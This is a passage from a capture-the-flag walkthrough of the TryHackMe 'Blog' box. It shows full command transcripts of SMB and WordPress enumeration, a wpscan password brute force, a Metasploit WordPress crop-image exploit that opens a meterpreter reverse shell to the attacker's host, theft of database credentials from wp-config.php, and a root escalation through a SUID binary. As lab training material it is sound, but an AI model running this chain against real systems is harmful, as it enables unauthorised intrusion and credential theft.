a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3233: /icons/README: Apache default file found.+ /wp-links-opml.php: This WordPress script reveals the installed version.+ OSVDB-3092: /license.txt: License file found may identify site software.+ /wp-app.log: Wordpress' wp-app.log may leak application/system details.+ /wordpresswp-app.log: Wordpress' wp-app.log may leak application/system details.+ /: A Wordpress installation was found.+ /wordpress: A Wordpress installation was found.+ Cookie wordpress_test_cookie created without the httponly flag+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information+ /wp-admin/wp-login.php: Wordpress login found+ /wordpresswp-admin/wp-login.php: Wordpress login found+ /blog/wp-login.php: Wordpress login found+ /wp-login.php: Wordpress login found+ /wordpresswp-login.php: Wordpress login found+ 7893 requests: 0 error(s) and 23 item(s) reported on remote host+ End Time: 2022-05-01 18:29:10 (GMT5.5) (2461 seconds)---------------------------------------------------------------------------+ 1 host(s) testedMoving on again..Enum4linuxEnum4linux is a tool for enumerating information from Windows and Samba systems.enum4linux 10.10.43.206 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) =========================================( Target Information )=========================================Target ........... 10.10.43.206RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ============================( Enumerating Workgroup/Domain on 10.10.43.206 )============================[+] Got domain/workgroup name: WORKGROUP ================================( Nbtstat Information for 10.10.43.206 )================================Looking up status of 10.10.43.206 BLOG &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service BLOG &lt;03&gt; - B &lt;ACTIVE&gt; Messenger Service BLOG &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 ===================================( Session Check on 10.10.43.206 )===================================[+] Server 10.10.43.206 allows sessions using username '', password '' ================================( Getting domain SID for 10.10.43.206 )================================Domain Name: WORKGROUPDomain Sid: (NULL SID)[+] Can't determine if host is part of domain or part of a workgroup ===================================( OS information on 10.10.43.206 )===================================[E] Can't get OS info with smbclient[+] Got OS info for 10.10.43.206 from srvinfo: BLOG Wk Sv PrQ Unx NT SNT blog server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03 =======================================( Users on 10.10.43.206 )=======================================Use of uninitialized value $users in print at ./enum4linux.pl line 972.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.Use of uninitialized value $users in print at ./enum4linux.pl line 986.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988. =================================( Share Enumeration on 10.10.43.206 )================================= Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy's local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP BLOG[+] Attempting to map shares on 10.10.43.206//10.10.43.206/print$ Mapping: DENIED Listing: N/A Writing: N/A//10.10.43.206/BillySMB Mapping: OK Listing: OK Writing: N/A[E] Can't understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*//10.10.43.206/IPC$ Mapping: N/A Listing: N/A Writing: N/A ============================( Password Policy Information for 10.10.43.206 )============================[+] Attaching to 10.10.43.206 using a NULL share[+] Trying protocol 139/SMB...[+] Found domain(s): [+] BLOG [+] Builtin[+] Password Info for Domain: BLOG [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: 37 days 6 hours 21 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: 37 days 6 hours 21 minutes [+] Retieved partial password policy with rpcclient:Password Complexity: DisabledMinimum Password Length: 5 =======================================( Groups on 10.10.43.206 )=======================================[+] Getting builtin groups:[+] Getting builtin group memberships:[+] Getting local groups:[+] Getting local group memberships:[+] Getting domain groups:[+] Getting domain group memberships: ==================( Users on 10.10.43.206 via RID cycling (RIDS: 500-550,1000-1050) )==================[I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-5-21-3132497411-2525593288-1635041108 and logon username '', password ''S-1-5-21-3132497411-2525593288-1635041108-501 BLOG\\nobody (Local User)S-1-5-21-3132497411-2525593288-1635041108-513 BLOG\\None (Domain Group)[+] Enumerating users using SID S-1-22-1 and logon username '', password ''S-1-22-1-1000 Unix User\\bjoel (Local User)S-1-22-1-1001 Unix User\\smb (Local User)[+] Enumerating users using SID S-1-5-32 and logon username '', password ''S-1-5-32-544 BUILTIN\\Administrators (Local Group)S-1-5-32-545 BUILTIN\\Users (Local Group)S-1-5-32-546 BUILTIN\\Guests (Local Group)S-1-5-32-547 BUILTIN\\Power Users (Local Group)S-1-5-32-548 BUILTIN\\Account Operators (Local Group)S-1-5-32-549 BUILTIN\\Server Operators (Local Group)S-1-5-32-550 BUILTIN\\Print Operators (Local Group) ===============================( Getting printer info for 10.10.43.206 )===============================No printers returned.Now we are getting somewhere..! We have BillySMB local share (For knowing the permissions allowed, we’ll run smbmap) and we got an username bjoel..!smbmapSMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents etc.smbmap -H 10.10.43.206 [+] Guest session IP: 10.10.43.206:445 Name: blog.thm Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers BillySMB READ, WRITE Billy's local SMB Share IPC$ NO ACCESS IPC Service (blog server (Samba, Ubuntu))Okay! We have Read-Write access on this local SMB share. Cool..!smbclientSMBClient communicates with a LAN Manager server, offering an interface similar to that of the ftp program.──(uber㉿uber)-[~/Desktop/THM/BillyBlog]└─$ smbclient //10.10.43.206/BillySMBPassword for [WORKGROUP\\uber]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Sun May 1 17:49:34 2022 .. D 0 Tue May 26 23:28:23 2020 Alice-White-Rabbit.jpg N 33378 Tue May 26 23:47:01 2020 tswift.mp4 N 1236733 Tue May 26 23:43:45 2020 check-this.png N 3082 Tue May 26 23:43:43 2020 15413192 blocks of size 1024. 9787876 blocks availablesmb: \\&gt; Hmmm.. what kind of files are these?? Let’s check them by fetching them into our system.smb: \\&gt; get Alice-White-Rabbit.jpg getting file \\Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (34.6 KiloBytes/sec) (average 34.6 KiloBytes/sec)smb: \\&gt; get tswift.mp4 getting file \\tswift.mp4 of size 1236733 as tswift.mp4 (212.7 KiloBytes/sec) (average 187.4 KiloBytes/sec)smb: \\&gt; get check-this.png getting file \\check-this.png of size 3082 as check-this.png (4.4 KiloBytes/sec) (average 170.2 KiloBytes/sec)smb: \\&gt; Man..! hahhah the tswift.mp4 made me kinda lol, the check-this.png is a qr code which leads us to a youtube song video and the Alice-White-Rabbit.jpg looks like just a normal picture at first glanceBut, I have a feeling that the whole rabbit hole thing doesn’t fit right. We should look this file for any hidden steganography.steghidesteghide extract -sf Alice-White-Rabbit.jpg -vEnter passphrase: reading stego file \"Alice-White-Rabbit.jpg\"... doneextracting data... donechecking crc32 checksum... okwriting extracted data to \"rabbit_hole.txt\"... doneHmmm..this file name really doesn’t look good..hahah. Let’s check it out.cat rabbit_hole.txt You've found yourself in a rabbit hole, friend.Man.. What a rabbit hole we fell into..! lolwpscanwpscan --url 10.10.43.206 -e u_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://10.10.43.206/ [10.10.43.206][+] Started:Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%[+] robots.txt found: http://10.10.43.206/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://10.10.43.206/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://10.10.43.206/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://10.10.43.206/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://10.10.43.206/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.43.206/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.0' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.43.206/, Match: 'WordPress 5.0'[i] The main theme could not be detected.[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 &lt;========================================================&gt; (10 / 10) 100.00% Time: 00:00:01[i] User(s) Identified:[+] bjoel | Found By: Wp Json Api (Aggressive Detection) | - http://10.10.43.206/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] kwheel | Found By: Wp Json Api (Aggressive Detection) | - http://10.10.43.206/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] Karen Wheeler | Found By: Rss Generator (Aggressive Detection)[+] Billy Joel | Found By: Rss Generator (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sun May 1 18:58:28 2022[+] Requests Done: 31[+] Cached Requests: 33[+] Data Sent: 8.067 KB[+] Data Received: 349.2 KB[+] Memory used: 157.012 MB[+] Elapsed time: 00:00:07We got another username kwheel. Nice..!hydra Hydra will not work as intended with both the usernames, advised to skip.wpscan for passwordTry with kwheel username as getting the password for bjoel is not working properly.┌──(uber㉿uber)-[~/Desktop/THM/BillyBlog]└─$ wpscan --url 10.10.43.206 -U 'kwheel' -P /home/uber/Downloads/rockyou.txt_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://10.10.43.206/ [10.10.43.206][+] Started:Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%[+] robots.txt found: http://10.10.43.206/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://10.10.43.206/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://10.10.43.206/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://10.10.43.206/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://10.10.43.206/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.43.206/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.0' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.43.206/, Match: 'WordPress 5.0'[i] The main theme could not be detected.[+] Enumerating All Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:07 &lt;=======================================================&gt; (137 / 137) 100.00% Time: 00:00:07[i] No Config Backups Found.[+] Performing password attack on Xmlrpc against 1 user/s[SUCCESS] - kwheel / redacted[!] Valid Combinations Found: | Username: kwheel, Password: redacted[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished:[+] Requests Done: 3032[+] Cached Requests: 5[+] Data Sent: 1.489 MB[+] Data Received: 1.878 MB[+] Memory used: 226.121 MB[+] Elapsed time: 00:04:30Got the password..!cveWe know that the wordpress version is 5.0 and it is vulnerable, so we’ll search for an exploit which will help us in moving further.Getting Shellmsfconsole┌──(uber㉿uber)-[~/Desktop/THM/BillyBlog]└─$ sudo msfconsole [sudo] password for uber: , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v6.1.39-dev ]+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post ]+ -- --=[ 614 payloads - 45 encoders - 11 nops ]+ -- --=[ 9 evasion ]Metasploit tip: Save the current environment with the save command, future console restarts will use this environment againmsf6 &gt; search crop-imageMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/wp_crop_rce 2019-02-19 excellent Yes WordPress Crop-image Shell UploadInteract with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rcemsf6 &gt; use 0[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(multi/http/wp_crop_rce) &gt; set RHOSTS 10.10.43.206RHOSTS =&gt; 10.10.43.206msf6 exploit(multi/http/wp_crop_rce) &gt; optionsModule options (exploit/multi/http/wp_crop_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The WordPress password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.43.206 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi t RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the wordpress application USERNAME yes The WordPress username to authenticate with VHOST no HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 WordPressmsf6 exploit(multi/http/wp_crop_rce) &gt; set PASSWORD redactedPASSWORD =&gt; redactedmsf6 exploit(multi/http/wp_crop_rce) &gt; set USERNAME kwheelUSERNAME =&gt; kwheelmsf6 exploit(multi/http/wp_crop_rce) &gt; set LHOST 10.9.2.90LHOST =&gt; 10.9.2.90msf6 exploit(multi/http/wp_crop_rce) &gt; set LPORT 1234LPORT =&gt; 1234msf6 exploit(multi/http/wp_crop_rce) &gt; run[*] Started reverse TCP handler on 10.9.2.90:1234 [*] Authenticating with WordPress using kwheel:redacted...[+] Authenticated with WordPress[*] Preparing payload...[*] Uploading payload[+] Image uploaded[*] Including into theme[*] Sending stage (39860 bytes) to 10.10.43.206[*] Attempting to clean up files...[*] Meterpreter session 1 opened (10.9.2.90:1234 -&gt; 10.10.43.206:57986 ) at meterpreter &gt; We got a meterpreter shell..nice..!meterpreter &gt; cat wp-config.php&lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to \"wp-config.php\" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress *//* Custom *//*define('WP_HOME', '/');define('WP_SITEURL', '/'); */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define('DB_NAME', 'blog');/** MySQL database username */define('DB_USER', 'wordpressuser');/** MySQL database password */define('DB_PASSWORD', 'redacted');/** MySQL hostname */define('DB_HOST', 'localhost');...Voila, we got the password for mr. bjoel also. Now we can easily login in his wordpress account.meterpreter &gt; cd homemeterpreter &gt; lsListing: /home==============Mode Size Type Last modified Name---- ---- ---- ------------- ----040755/rwxr-xr-x 4096 dir 2020-05-27 01:38:48 +0530 bjoelmeterpreter &gt; cd bjoelmeterpreter &gt; lsListing: /home/bjoel====================Mode Size Type Last modified Name---- ---- ---- ------------- ----020666/rw-rw-rw- 0 cha 2022-05-01 17:23:21 +0530 .bash_history100644/rw-r--r-- 220 fil 2018-04-05 00:00:26 +0530 .bash_logout100644/rw-r--r-- 3771 fil 2018-04-05 00:00:26 +0530 .bashrc040700/rwx------ 4096 dir 2020-05-25 18:45:58 +0530 .cache040700/rwx------ 4096 dir 2020-05-25 18:45:58 +0530 .gnupg100644/rw-r--r-- 807 fil 2018-04-05 00:00:26 +0530 .profile100644/rw-r--r-- 0 fil 2020-05-25 18:46:22 +0530 .sudo_as_admin_successful100644/rw-r--r-- 69106 fil 2020-05-27 00:03:24 +0530 Billy_Joel_Termination_May20-2020.pdf100644/rw-r--r-- 57 fil 2020-05-27 01:38:47 +0530 user.txtmeterpreter &gt; cat user.txtYou won't find what you're looking for here.TRY HARDERmeterpreter &gt; download Billy_Joel_Termination_May20-2020.pdfWe can’t get the user.txt flag that easily.. .There is an interesting file Billy_Joel_Termination_May20-2020.pdf. Let’s download this file into our system and check it out.Oooh, something tells me that we have to look into the /media folder..!meterpreter &gt; cd mediameterpreter &gt; lsListing: /media===============Mode Size Type Last modified Name---- ---- ---- ------------- ----040700/rwx------ 4096 dir 2020-05-29 00:54:09 +0530 usbmeterpreter &gt; cd usb[-] stdapi_fs_chdir: Operation failed: 1meterpreter &gt; As expected, we need root level access. Now, the time is for some privilege escalation.Privilege EscalationBinary Exploitmeterpreter &gt; shellProcess 4684 created.Channel 5 created.sudo -lsudo: no tty present and no askpass program specifiedfind / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\;-rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd-rwsr-xr-x 1 root root 40344 Mar 22 2019 /usr/bin/newgrp-rwsr-xr-x 1 root root 75824 Mar 22 2019 /usr/bin/gpasswd-rwsr-xr-x 1 root root 44528 Mar 22 2019 /usr/bin/chsh-rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newuidmap-rwsr-xr-x 1 root root 22520 Mar 27 2019 /usr/bin/pkexec-rwsr-xr-x 1 root root 76496 Mar 22 2019 /usr/bin/chfn-rwsr-xr-x 1 root root 149080 Jan 31 2020 /usr/bin/sudo-rwsr-sr-x 1 daemon daemon 51464 Feb 20 2018 /usr/bin/at-rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newgidmap-rwsr-xr-x 1 root root 18448 Jun 28 2019 /usr/bin/traceroute6.iputils-rwsr-sr-x 1 root root 8432 May 26 2020 /usr/sbin/checker-rwsr-xr-x 1 root root 100760 Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic-rwsr-xr-- 1 root messagebus 42992 Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-sr-x 1 root root 109432 Oct 30 2019 /usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 14328 Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-xr-x 1 root root 436552 Mar 4 2019 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 43088 Mar 5 2020 /bin/mount-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount-rwsr-xr-x 1 root root 26696 Mar 5 2020 /bin/umount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /bin/ping-rwsr-xr-x 1 root root 44664 Mar 22 2019 /bin/su-rwsr-xr-x 1 root root 40152 Oct 10 2019 /snap/core/8268/bin/mount-rwsr-xr-x 1 root root 44168 May 7 2014 /snap/core/8268/bin/ping-rwsr-xr-x 1 root root 44680 May 7 2014 /snap/core/8268/bin/ping6...Ran the find SUID binary command and we have one interesting binary here, which is checker.We’ll try to run this binarypython -c 'import pty; pty.spawn(\"/bin/sh\")'$ export TERM=xterm-256colorexport TERM=xterm-256color$ /usr/sbin/checker /usr/sbin/checkerNot an AdminInteresting..! Let’s check the workings via strings$ strings /usr/sbin/checkerstrings /usr/sbin/checker/lib64/ld-linux-x86-64.so.2libc.so.6setuidputsgetenvsystem__cxa_finalize__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable=9 AWAVIAUATL[]A\\A]A^A_admin/bin/bashNot an Admin;*3$\"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0crtstuff.c...Seems like it is validating that there is an admin in the env or not by invoking getenv. Let’s play with this binary and do some manual exploit.$ export admin=1export admin=1$ /usr/sbin/checker/usr/sbin/checkerroot@blog:/media# whoamiwhoamirootroot@blog:/media# Boom..! we are now root..!Getting the user.txt flagroot@blog:/media# cd usbcd usbroot@blog:/media/usb# lslsuser.txtroot@blog:/media/usb# cat user.txtcat user.txtredactedroot@blog:/media/usb# Getting the root.txt flagroot@blog:/media/usb# find / -name root.txtfind / -name root.txt/root/root.txtfind: '/proc/4500/task/4500/net': Invalid argumentfind: '/proc/4500/net': Invalid argumentfind: '/proc/4719/task/4719/net': Invalid argumentfind: '/proc/4719/net': Invalid argumentfind: '/proc/4807/task/4807/net': Invalid argumentfind: '/proc/4807/net': Invalid argumentroot@blog:/media/usb# cat /root/root.txtcat /root/root.txtredactedroot@blog:/media/usb# That’s it folks, this was all about the Blog box.Thank you so much for being till the end. See you guys next time…!" } ]
